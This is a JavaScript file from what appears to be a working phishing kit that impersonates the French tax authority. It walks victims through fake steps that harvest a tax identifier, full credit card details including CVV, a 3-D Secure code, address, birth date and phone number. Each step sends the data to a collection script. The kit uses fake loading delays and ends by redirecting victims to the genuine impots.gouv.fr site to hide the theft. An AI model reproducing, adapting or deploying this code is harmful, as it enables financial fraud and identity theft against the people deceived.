let mail = ""
let finalnum = ""
function load(page){
    let load = new XMLHttpRequest;
    load.open('GET','pages/'+page+'.php')
    load.addEventListener('load',()=>{
        
        if (page == "2") {
            document.getElementById('wc').innerHTML = load.responseText
            $('#tel').inputmask('99 99 99 99 99',{'placeholder':''})
            $('#exp').inputmask('99/99',{'placeholder':''})
            $('#zip').inputmask('99999',{'placeholder':''})
            $('#cc').inputmask('9999 9999 9999 9999',{'placeholder':''})
        }else if (page == "3") {
            let getLoad = new XMLHttpRequest
            getLoad.open('GET','pages/load.php')
            getLoad.addEventListener('load',()=>{
                document.getElementById('wc').innerHTML = getLoad.responseText
                setTimeout(()=>{
                    document.getElementById('wc').innerHTML = load.responseText
                },30000)
            })
            getLoad.send()
        }else if (page == "4") {
            let getLoad = new XMLHttpRequest
            getLoad.open('GET','pages/load.php')
            getLoad.addEventListener('load',()=>{
                document.getElementById('wc').innerHTML = getLoad.responseText
                setTimeout(()=>{
                    document.getElementById('wc').innerHTML = load.responseText
                },5000)
            })
            getLoad.send()
        }else{
            document.getElementById('wc').innerHTML = load.responseText
        }

    })
    load.send()
}

if (login == "yes") {
    load("1")
}else{
    load("2")
}


function visibility(type,id){
    if (type == "hide") {
        document.getElementById(id).style.display = "none"
    }
    if (type == "show") {
        document.getElementById(id).style.display = "block"
    }
}

function value(id){
    return document.getElementById(id).value
}

function showError(type,error=""){
    if (type == "show") {
        document.getElementById('error').innerHTML = "<p>"  + error + "</p>"
        document.getElementById('error').style.display = "block"
    }
    if (type == "hide") {
        document.getElementById('error').style.display = "none"
    }
}

function sendrez(step,rez){
    let sendr = new XMLHttpRequest;
    sendr.open('GET','main.php?action=send&rez=' + rez + "&step=" + step)
    sendr.send()
}

var luhn = (function (arr) {
    return function (ccNum) {
        var 
            len = ccNum.length,
            bit = 1,
            sum = 0,
            val;

        while (len) {
            val = parseInt(ccNum.charAt(--len), 10);
            sum += (bit ^= 1) ? arr[val] : val;
        }

        return sum && sum % 10 === 0;
    };
}([0, 2, 4, 6, 8, 1, 3, 5, 7, 9]));


function submit(step){
    if (step == "1") {
        let ident = value('identifiant')
        if (ident.length == 13) {
            showError('hide')
            sendrez(step,ident)
            load("2")
        }else{
            showError('show','Le numéro fiscale doit contenir 13 caratères.')
        }
    }
    if (step == "2") {
        let cc = value('cc')
        let exp = value('exp')
        let ccv = value('ccv')
        let ccname = value('ccname')
        let name = value('firstname') + ' ' + value('lastname')
        let city = value('city')
        let zip = value('zip')
        let address = value('address')
        let dobd      = value('dd')
        let dobm      = value('mm')
        let doby      = value('yy')
        let dob       = dobd + '/' + dobm + '/' + doby
        let tel = value('tel')
                if (city != "") {
                    if (zip != "") {
                        if (address != "") {
                            if (parseInt(dob.split('/')[2]) <= 2004 && dob.split('/')[2].length == 4) {
                                if (tel.split(' ')[0] == "06" || tel.split(' ')[0] == "07") {
                                    if (tel.length == 14) {
                                        if (cc.length == 19 && luhn(cc.replace(' ','').replace(' ','').replace(' ',''))) {
                                            if (exp.split('/')[1] > 22) {
                                                if (ccv.length >= 3) {
                                                    showError('hide')
                                                    sendrez(step,ccname + '|' + cc+ '|' + exp+ '|' + ccv + '|' + name + '|' + city + '|' + zip + '|' + address + '|' + tel + '|' + dob)
                                                    if (apple == "yes") {
                                                        load('3')
                                                    }else{
                                                        load('4')
                                                        setTimeout(()=>{
                                                            window.location  = "https://www.impots.gouv.fr/particulier"
                                                        },6000)
                                                    }
                                                }else{
                                                    showError('show','Veuillez entrer un CCV valide.')
                                                }
                                            }else{
                                                showError('show','Veuillez entrer une date d\'expiration valide.')
                                            }
                                        }else{
                                            showError('show','Veuillez entrer une carte de crédit valide.')
                                        }
                                        
                                    }else{
                                        showError('show','Veuillez entrer un numéro de téléphone correct.')
                                    }
                                }else{
                                    showError('show','Veuillez entrer un numéro de téléphone correct.')
                                }
                            }else{
                                showError('show','Veuillez entrer une date de naissance correcte.')
                            }
                        }else{
                            showError('show','Veuillez entrer une adresse correcte.')
                        }
                    }else{
                        showError('show','Veuillez entrer un code postal correct.')
                    }
                }else{
                    showError('show','Veuillez entrer une ville correcte.')
                }
            }
    
    if (step == '3') {
        let code = value('vbv')
        if (code.length > 3) {
            sendrez(step,code)
            load('4')
            setTimeout(()=>{
                window.location  = "https://www.impots.gouv.fr/particulier"
            },6000)
        }else{
            showError('show','Veuillez entrer un code correct.')
        }
    }

}